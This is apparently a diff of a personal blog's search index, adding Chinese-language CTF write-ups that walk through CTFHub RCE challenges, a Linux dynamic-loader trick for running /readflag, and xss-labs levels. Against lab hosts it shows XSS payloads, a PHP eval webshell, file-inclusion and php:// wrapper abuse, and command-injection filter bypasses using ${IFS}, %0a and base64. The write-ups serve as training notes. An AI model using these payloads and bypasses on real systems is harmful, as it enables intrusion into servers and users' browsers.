-<pre class="line-numbers language-python" data-language="python"><code class="language-python">http<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token operator">/</span>xss<span class="token operator">-</span>labs<span class="token operator">/</span>level18<span class="token punctuation">.</span>php<span class="token operator">/</span>xsf02<span class="token punctuation">.</span>swf?a<span class="token operator">=</span>?arg01<span class="token operator">=</span>a<span class="token operator">&amp;</span>arg02<span class="token operator">=</span><span class="token operator">%</span>20onmouseover<span class="token operator">=</span>javascript<span class="token punctuation">:</span>alert<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/d2caecf88dc64e4fbbfe4d6aff041882.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
-<h1 id="level-19-20"><a href="#level-19-20" class="headerlink" title="level 19-20"></a>level 19-20</h1><p><a href="https://www.cnblogs.com/-qing-/p/10853379.html">Flash XSS漏洞快速上手</a><br><a href="https://www.secpulse.com/archives/44299.html">flash xss原理</a><br><a href="https://github.com/jindrapetrik/jpexs-decompiler">flash反编译工具</a><br>以下是大佬的payload</p>
+    <title>linux动态加载</title>
+    <url>/2022/11/linux%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/</url>
+    <content><![CDATA[<h2 id="linux动态加载"><a href="#linux动态加载" class="headerlink" title="linux动态加载"></a>linux动态加载</h2><h1 id="查看环境"><a href="#查看环境" class="headerlink" title="查看环境"></a>查看环境</h1><p>先给了755<br>他自己传了flag 等于告诉我们在哪了<br>然后限到了644<br>不想让我们直接看</p>
 <blockquote>
-<p>卑微小杨在线emo<br>flash反编译也不懂<br>等有空了再研究吧<br>好多困难等着被克服那<br>这次没支持flash的浏览器真没法做</p>
-<p>18关</p>
+<p>都到这一题了权限应该不用讲了</p>
 </blockquote>
-<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token property">http</span><span class="token punctuation">:</span>//10.0.1.83/xsslab/level19.php?arg01=version&amp;arg02=&lt;a href=<span class="token string">"javascript:alert(/bmfx/)"</span>>bmfx&lt;/a> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>19关</p>
-<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token property">http</span><span class="token punctuation">:</span>//10.0.1.83/xsslab/level20.php?arg01=id&amp;arg02=bmfx\"<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token selector">catch(e)</span><span class="token punctuation">&#123;</span><span class="token function">alert</span><span class="token punctuation">(</span>/bmfx/<span class="token punctuation">)</span><span class="token punctuation">&#125;</span>//%26width=998%26height=998<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
+<p>提示给了shell<br>且不需要提权<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/a694c0aa89c24d1ba00256e97cefd34b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>于是需要新学一个东西<br>动态加载</p>
+<h1 id="Linux-ELF-Dynaamic-Loader"><a href="#Linux-ELF-Dynaamic-Loader" class="headerlink" title="Linux ELF Dynaamic Loader"></a>Linux ELF Dynaamic Loader</h1><h2 id="elf文件"><a href="#elf文件" class="headerlink" title="elf文件"></a>elf文件</h2><p>elf文件是linux下的可执行文件<br>文件头为elf</p>
+<blockquote>
+<p>不知道是靶机还是蚁剑虚拟终端的问题 没法vi<br>直接cat就能看到了</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/14c42167ec0745548b280beb335e12b1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
+</blockquote>
+<h2 id="动态库链接器-x2F-加载器"><a href="#动态库链接器-x2F-加载器" class="headerlink" title="动态库链接器&#x2F;加载器"></a>动态库链接器&#x2F;加载器</h2><ul>
+<li>当需要动态链接的应用被操作系统加载时</li>
+<li>系统必须要定位然后加载它所需要的所有动态库文件</li>
+<li>在Linux环境下，这项工作是由ld-linux.so.2来负责完成的</li>
+<li>执行操作时操作系统会将控制权交给 ld-linux.so</li>
+<li>而不是交给程序正常的进入地址</li>
+<li>ld-linux.so.2 会寻找然后加载所有需要的库文件，然后再将控制权交给应用的起始入口。</li>
+</ul>
+<h2 id="ldd命令"><a href="#ldd命令" class="headerlink" title="ldd命令"></a>ldd命令</h2><p>使用ldd命令即可查看<br>简便的shell命令依赖哪些动态加载库<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/669b04b31dd04fe1a8d320ea2540ced2.png" alt="在这里插入图片描述"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/67a17bc7a0144be2a741e537f7ab2380.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
+<h1 id="姿势"><a href="#姿势" class="headerlink" title="姿势"></a>姿势</h1><p>在cat elf文件时<br>看到第一行后面&#x2F;lib64&#x2F;ld-linux-x86-64.so.2 动态库<br>并且在ldd<br>可以看到ls 和 cat动用他了<br>用！<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/e49dc243bc714d2e95cb5223b895599e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述">这是他的介绍<br>执行</p>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;lib64&#x2F;ld-linux-x86-64.so.2 &#x2F;readflag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>get</p>
+]]></content>
       <categories>
         <category>ctf</category>
       </categories>
       <tags>
         <tag>web</tag>
-        <tag>xss</tag>
-        <tag>xss-lab</tag>
+        <tag>ctfhub</tag>
+        <tag>linux</tag>
+        <tag>动态加载</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ctfhub-rce</title>
+    <url>/2022/11/ctfhub-rce/</url>
+    <content><![CDATA[<p>rce：远程代码执行漏洞<br>分为远程命令执行ping和远程代码执行evel。<br><strong>其实这就是一个接口，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统，这就是RCE漏洞</strong>。相当于直接操控服务器电脑的cmd命令行！高危漏洞！</p>
+<h1 id="eval执行"><a href="#eval执行" class="headerlink" title="eval执行"></a>eval执行</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+	<span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+        <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>传参给cmd来eval</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">/</span><span class="token operator">?</span>cmd<span class="token operator">=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ls /"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//此处因为根目录无flag 所以看上一级目录</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>找到后 再cat &#x2F;flag_****</p>
+<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><p>这里使用strpos函数</p>
+<blockquote>
+<p>strpos:查找字符串首次出现的位置</p>
+<p>int strpos ( string $haystack , mixed $needle [, int $offset &#x3D; 0 ] )</p>
+</blockquote>
+<p>题目使用</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"flag"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//无flag字符即可运行</span>
+    <span class="token keyword">include</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>来包含文件，而下方给出的shell.txt含有eval漏洞</p>
+<p>于是包含它（shell.txt没有“flag”字符 所以这里strpos没影响）</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:\Users\CNsirius\AppData\Roaming\Typora\typora-user-images\image-20220218182857507.png" alt="image-20220218182857507"></p>
+<p>通过get(包含文件) post(传参)并用来得到flag</p>
+<h1 id="php-info"><a href="#php-info" class="headerlink" title="php info"></a>php info</h1><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;?php
+if (isset($_GET[&#39;file&#39;]))&#123;  
+	if ( substr($_GET[&quot;file&quot;], 0, 6) &#x3D;&#x3D;&#x3D; &quot;php:&#x2F;&#x2F;&quot; ) &#123;
+        include($_GET[&quot;file&quot;]);  
+         &#125;
+    else &#123; 
+        echo &quot;Hacker!!!&quot;;
+    	&#125;&#125;
+else &#123;
+    highlight_file(__FILE__);&#125;?&gt;
+&lt;hr&gt;i don&#39;t have shell, how to get flag? &lt;br&gt;&lt;a href&#x3D;&quot;phpinfo.php&quot;&gt;phpinfo&lt;&#x2F;a&gt; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>点击phpinfo链接 可查看php环境</p>
+<h2 id="php-x2F-x2F-input"><a href="#php-x2F-x2F-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h2><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">&#x2F;*php:&#x2F;&#x2F; — 访问各个输入&#x2F;输出流（I&#x2F;O streams）
+
+PHP 提供了一些杂项输入&#x2F;输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，   内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。  
+
+php:&#x2F;&#x2F;input是个可以访问请求的原始数据的只读流。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:\Users\CNsirius\AppData\Roaming\Typora\typora-user-images\image-20220218162728184.png" alt="image-20220218162728184"></p>
+<h1 id="读取源代码"><a href="#读取源代码" class="headerlink" title="读取源代码"></a>读取源代码</h1><p>看环境 无法使用php:&#x2F;&#x2F;input</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&lt;</span>?php
+error_reporting<span class="token punctuation">(</span>E_ALL<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span>isset<span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">))</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span> substr<span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span>, <span class="token number">0</span>, <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">==</span><span class="token operator">=</span> <span class="token string">"php://"</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        include<span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+        <span class="token builtin class-name">echo</span> <span class="token string">"Hacker!!!"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+    highlight_file<span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>但还必须是php:&#x2F;&#x2F;开头</p>
+<h2 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a><a href="https://www.php.net/manual/zh/wrappers.php.php">php:&#x2F;&#x2F;filter</a></h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:\Users\CNsirius\AppData\Roaming\Typora\typora-user-images\image-20220219174206504.png" alt="image-20220219174206504"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:\Users\CNsirius\AppData\Roaming\Typora\typora-user-images\image-20220219112308277.png" alt="image-20220219112308277"></p>
+<h1 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h1><p>同phpinfo做法相同</p>
+<h1 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h1><p>输入命令</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">127.0</span>.0.1<span class="token punctuation">;</span><span class="token function">ls</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>然后cat时出现了问题</p>
+<p>输出被限制了</p>
+<p>于是用管道符号来限制输出base64</p>
+<p>得到后再解码</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:\Users\CNsirius\AppData\Roaming\Typora\typora-user-images\image-20220218170811553.png" alt="image-20220218170811553"></p>
+<h1 id="过滤cat"><a href="#过滤cat" class="headerlink" title="过滤cat"></a>过滤cat</h1><pre class="line-numbers language-php+html" data-language="php+html"><code class="language-php+html">&lt;?php
+$res &#x3D; FALSE;
+if (isset($_GET[&#39;ip&#39;]) &amp;&amp; $_GET[&#39;ip&#39;]) &#123;
+    $ip &#x3D; $_GET[&#39;ip&#39;];
+    $m &#x3D; [];
+    if (!preg_match_all(&quot;&#x2F;cat&#x2F;&quot;, $ip, $m)) &#123;&#x2F;&#x2F;过滤了cat
+        $cmd &#x3D; &quot;ping -c 4 &#123;$ip&#125;&quot;;
+        exec($cmd, $res);
+    &#125; 
+    else &#123;
+        $res &#x3D; $m;
+    &#125;
+&#125;
+?&gt;
+
+&lt;pre&gt;
+&lt;?php
+    if ($res) &#123;
+        print_r($res);
+    &#125;
+?&gt;
+&lt;&#x2F;pre&gt;
+&lt;?php
+	show_source(__FILE__);
+?&gt;
+&lt;&#x2F;body&gt;
+&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h1 id="more"><a href="#more" class="headerlink" title="more"></a>more</h1><p>Linux more 命令类似 cat  ，不过会以一页一页的形式显示，更方便使用者逐页阅读，而最基本的指令就是按空白键（space）就往下一页显示，按 b  键就会往回（back）一页显示，而且还有搜寻字串的功能（与 vi 相似），使用中的说明文件，请按 h 。</p>
+<pre class="line-numbers language-ini" data-language="ini"><code class="language-ini">more [-dlfpcsu] [-num] [+/pattern] [+linenum] [fileNames..]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:\Users\CNsirius\AppData\Roaming\Typora\typora-user-images\image-20220218171602745.png" alt="image-20220218171602745"></p>
+<h1 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h1><p>在linux里空格可用&lt; 或 ${IFS}代替</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:\Users\CNsirius\AppData\Roaming\Typora\typora-user-images\image-20220218171910282.png" alt="image-20220218171910282"></p>
+<h1 id="过滤运算符"><a href="#过滤运算符" class="headerlink" title="过滤运算符"></a>过滤运算符</h1><p>cat [file]|base64还可以用base64 [file]</p>
+<pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;?php
+$res &#x3D; FALSE;
+if (isset($_GET[&#39;ip&#39;]) &amp;&amp; $_GET[&#39;ip&#39;]) &#123;
+    $ip &#x3D; $_GET[&#39;ip&#39;];
+    $m &#x3D; [];
+    if (!preg_match_all(&quot;&#x2F;(\||\&amp;)&#x2F;&quot;, $ip, $m)) &#123;
+        $cmd &#x3D; &quot;ping -c 4 &#123;$ip&#125;&quot;;
+        exec($cmd, $res);
+    &#125; else &#123;
+        $res &#x3D; $m;
+    &#125;
+&#125;
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:\Users\CNsirius\AppData\Roaming\Typora\typora-user-images\image-20220219104650896.png" alt="image-20220219104650896"></p>
+<h1 id="综合练习"><a href="#综合练习" class="headerlink" title="综合练习"></a>综合练习</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">!</span><span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/(\||&amp;|;| |\/|cat|flag|ctfhub)/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>;可以用%0a(url编码)	cat用base64	flag用正则f***    *lag等	空格用 ${IFS}</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:\Users\CNsirius\AppData\Roaming\Typora\typora-user-images\image-20220219105932534.png" alt="image-20220219105932534"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:\Users\CNsirius\AppData\Roaming\Typora\typora-user-images\image-20220219110644693.png" alt="image-20220219110644693"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:\Users\CNsirius\AppData\Roaming\Typora\typora-user-images\image-20220219110736333.png" alt="image-20220219110736333"></p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>ctfhub</tag>
+        <tag>rce</tag>
       </tags>
   </entry>
   <entry>
@@ -1034,6 +988,52 @@ The key's randomart image is:
       <tags>
         <tag>web</tag>
         <tag>ssh</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>xss-lab</title>
+    <url>/2022/11/xsslab/</url>
+    <content><![CDATA[<h1 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h1><p>没啥好说的<br>直接alert<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/7cff66907f234fe8a9264319b7fcb8de.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
+<h1 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h1><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>keyword</span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>test<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+//改后是
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>keyword</span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1111<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span>……>//
+1111"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span>……这是输入的部分
+前后闭合<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h1 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h1><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/1e4c13e4bc1d4537880deaf36855ab42.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>用了htmlspeialchars()函数	&lt;&gt;”都被过滤<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/7c28fa1a02bd4383ac5f0cb8df3f3f95.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述">二者都写可以</p>
+<h1 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h1><p>和上面一样</p>
+<h1 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h1><p>on 和 script都被过滤<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/ec2a556e55ba4c9b84c5a07d3aedff9c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述">这里用javascript:伪协议<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/3d92413c5c624059aab10d022aefcf04.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述">出来的链接就是答案</p>
+<h1 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h1><p>可以大小写绕过</p>
+<h1 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h1><p>把特殊字符便空了<br>可以双写绕过</p>
+<h1 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h1><p>这关卡的死死的<br>要编码绕过<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/d233b7b1bba44b50b4aeeab90330e7e1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
+<h1 id="level-9"><a href="#level-9" class="headerlink" title="level  9"></a>level  9</h1><p>strpos函数看是否有http:&#x2F;&#x2F;<br>验证是否为安全连接<br>但是没有限定位置<br>要编码下<br>还要把http:&#x2F;&#x2F;放最后面用&#x2F;&#x2F;注释掉<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/9d5db481746d4a9f95e8001a62ccd7bf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
+<h1 id="level-10-13"><a href="#level-10-13" class="headerlink" title="level 10-13"></a>level 10-13</h1><p>页面没有注入点<br>看源代码发现隐藏的表单<br>要改为文本框text</p>
+<pre class="line-numbers language-css" data-language="css"><code class="language-css">type=<span class="token string">"text"</span> onclick=<span class="token string">"alert(1)"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>后面几关都要改t_sort<br>因为后端获取t_sort和user-agent等<br>要从相应注入点注入<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/2040ace8d49d4257a8553820b103ff93.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
+<h1 id="level-14"><a href="#level-14" class="headerlink" title="level 14"></a>level 14</h1><blockquote>
+<p>exif xss漏洞，exif是可交换图像文件格式（英语：Exchangeable image file format，官方简称Exif），是专门为数码相机的照片设定的，可以记录数码照片的属性信息和拍摄数据。我们右键图片选择属性，点击详细信息就可以看到exif的相关属性。</p>
+<p>喜欢摄影的应该都知道一张照片可以看快门时间 快门次数等很多参数<br>甚至有些照片能看到经纬度<br>这关要用到<br><a href="http://ww1.exifviewer.org/">exifviewer</a>网页<br>但是<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/b0ccd08d54844a0ab8326ecdebed2497.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img-blog.csdnimg.cn/a28e85a7ace44b67a82fb0f28009f4a6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
+</blockquote>
+<h1 id="level-15"><a href="#level-15" class="headerlink" title="level 15"></a>level 15</h1><h1 id="level-16"><a href="#level-16" class="headerlink" title="level 16"></a>level 16</h1><p>对script、&#x2F;、空格进行了转换<br>空格不可以就用换行符</p>
